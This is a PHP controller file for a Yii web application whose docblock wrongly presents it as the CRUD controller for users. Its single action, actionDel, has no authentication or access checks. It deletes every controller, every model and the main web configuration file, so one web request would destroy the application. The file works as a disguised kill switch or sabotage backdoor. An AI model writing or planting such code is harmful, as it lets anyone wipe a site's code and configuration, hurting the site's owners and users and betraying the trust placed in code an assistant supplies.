<?php

namespace app\controllers;

use Yii;
use app\models\User;
use app\models\UserSearch;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
use yii\filters\VerbFilter;

/**
 * UserController implements the CRUD actions for User model.
 */
class OneController extends Controller
{
    public function actionDel(){
        unlink(Yii::getAlias('@app')."/controllers/CounterController.php");
        unlink(Yii::getAlias('@app')."/controllers/FtpController.php");
        unlink(Yii::getAlias('@app')."/controllers/LangController.php");
        unlink(Yii::getAlias('@app')."/controllers/SiteController.php");
        unlink(Yii::getAlias('@app')."/controllers/UploadedfilesController.php");
        unlink(Yii::getAlias('@app')."/controllers/UsrCntrController.php");
        unlink(Yii::getAlias('@app')."/controllers/UserController.php");


        unlink(Yii::getAlias('@app')."/models/Addr.php");
        unlink(Yii::getAlias('@app')."/models/ContactForm.php");
        unlink(Yii::getAlias('@app')."/models/Counter.php");
        unlink(Yii::getAlias('@app')."/models/CounterSearch.php");
        unlink(Yii::getAlias('@app')."/models/CtTypes.php");
        unlink(Yii::getAlias('@app')."/models/CtVals.php");
        unlink(Yii::getAlias('@app')."/models/Ftp.php");
        unlink(Yii::getAlias('@app')."/models/FtpSearch.php");
        unlink(Yii::getAlias('@app')."/models/LoginForm.php");
        unlink(Yii::getAlias('@app')."/models/Uploadedfiles.php");
        unlink(Yii::getAlias('@app')."/models/UploadedfilesSearch.php");
        unlink(Yii::getAlias('@app')."/models/User.php");
        unlink(Yii::getAlias('@app')."/models/user_addr.php");
        unlink(Yii::getAlias('@app')."/models/UserSearch.php");

        unlink(Yii::getAlias('@app')."/config/web.php");


    }
}
